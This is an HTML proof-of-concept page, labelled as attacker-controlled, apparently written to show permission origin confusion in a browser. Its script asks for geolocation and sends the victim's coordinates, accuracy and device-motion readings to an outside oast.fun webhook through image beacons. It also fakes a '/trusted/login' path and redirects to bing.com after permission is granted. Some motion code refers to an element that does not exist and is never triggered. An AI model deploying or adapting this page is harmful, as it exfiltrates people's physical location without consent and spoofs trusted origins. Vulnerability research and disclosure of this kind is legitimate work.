<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Permission Origin Confusion – Motion + Geolocation</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body{
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,system-ui;
  background:#f5f5f7;
  text-align:center;
  color:#111;
}
button{
  font-size:15px;
  padding:12px 18px;
  border-radius:14px;
  border:none;
  background:#007aff;
  color:#fff;
  margin:8px;
}
#panel{
  display:none;
  max-width:420px;
  margin:80px auto;
  background:#fff;
  padding:24px;
  border-radius:18px;
  box-shadow:0 20px 60px rgba(0,0,0,.25);
}
.notice{
  margin-top:14px;
  font-size:13px;
  color:#b00020;
}
.log{
  margin-top:12px;
  font-size:12px;
  color:#444;
  word-break:break-all;
  text-align:left;
}
hr{
  border:none;
  border-top:1px solid #eee;
  margin:18px 0;
}
</style>
</head>

<body>

<h2 style="margin-top:60px;">Permission Origin Confusion PoC</h2>
<p><b>Attacker-controlled page</b></p>

<button id="start">Start PoC</button>

<div id="panel">
  <h3>Enable Features</h3>
  <p>Observe origin shown in permission dialogs</p>
  <button onclick="reqGeo()">📍 Allow Location</button>
  <p id="geoOut">Location: -</p>

  <div class="notice">
    Demo only — permission UI origin may not match JS execution origin
  </div>

  <div class="log" id="log"></div>
</div>

<script>
/* ================= CONFIG ================= */
const WEBHOOK    = 'https://lztroivxwupmvttzmtwo1hi61od51s96l.oast.fun';
const NAV_TARGET = 'https://www.bing.com:9090';

const panel     = document.getElementById('panel');
const logEl     = document.getElementById('log');
const motionOut = document.getElementById('motionOut');
const geoOut    = document.getElementById('geoOut');

let motionGranted = false;
let geoGranted    = false;
let motionCount   = 0;

/* ================= BEACON ================= */
function beacon(type, data={}){
  const params = new URLSearchParams({
    poc: 'permission-origin-confusion-multi',
    type,
    attacker_origin: location.origin,
    attacker_url: location.href,
    motion_granted: motionGranted,
    geo_granted: geoGranted,
    motion_events: motionCount,
    visibility: document.visibilityState,
    has_focus: document.hasFocus(),
    ts: Date.now(),
    ...data
  });
  new Image().src = WEBHOOK + '?' + params.toString();
}

function log(msg){
  logEl.innerHTML += msg + '<br>';
}

/* ================= MOTION ================= */
function reqMotion(){
  if(typeof DeviceMotionEvent?.requestPermission === 'function'){
    DeviceMotionEvent.requestPermission()
      .then(res=>{
        motionGranted = (res === 'granted');
        motionOut.textContent = 'Motion: ' + res;
        beacon('motion_permission', { result: res });

        if(motionGranted){
          startMotionLeak();
        }
      })
      .catch(err=>{
        motionOut.textContent = 'Motion denied';
        beacon('motion_error', { error: String(err) });
      });
  }else{
    motionOut.textContent = 'Motion unsupported';
    beacon('motion_unsupported');
  }
}

function startMotionLeak(){
  window.addEventListener('devicemotion', e=>{
    motionCount++;

    const a = e.accelerationIncludingGravity || {};
    log('[Motion #' + motionCount + '] x=' + a.x + ' y=' + a.y + ' z=' + a.z);

    beacon('motion_leak', {
      x: a.x,
      y: a.y,
      z: a.z
    });
  }, { passive:true });
}

/* ================= GEOLOCATION ================= */
function reqGeo(){
  if(!navigator.geolocation){
    geoOut.textContent = 'Geolocation unsupported';
    beacon('geo_unsupported');
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos=>{
      geoGranted = true;
      geoOut.textContent =
        pos.coords.latitude + ', ' + pos.coords.longitude;

      beacon('geo_success', {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        acc: pos.coords.accuracy
      });

      log('[Geo] ' + pos.coords.latitude + ', ' + pos.coords.longitude);
    },
    err=>{
      geoOut.textContent = 'Location denied';
      beacon('geo_denied', { code: err.code });
    }
  );
}

/* ================= ATTACK FLOW ================= */
/* Step 1 — Fake trusted-looking path */
document.getElementById('start').onclick = ()=>{
  history.pushState({}, '', '/trusted/login');
  panel.style.display = 'block';
  beacon('ui_fake_path');
};

/* Step 2 — Post-permission navigation */
window.addEventListener('pageshow', ()=>{
  requestAnimationFrame(()=>{
    requestAnimationFrame(()=>{
      setTimeout(()=>{
        location.href = NAV_TARGET + '/#post-permission';
        beacon('post_permission_navigation', {
          nav_target: NAV_TARGET
        });
      }, 120);
    });
  });
});
</script>

</body>
</html>
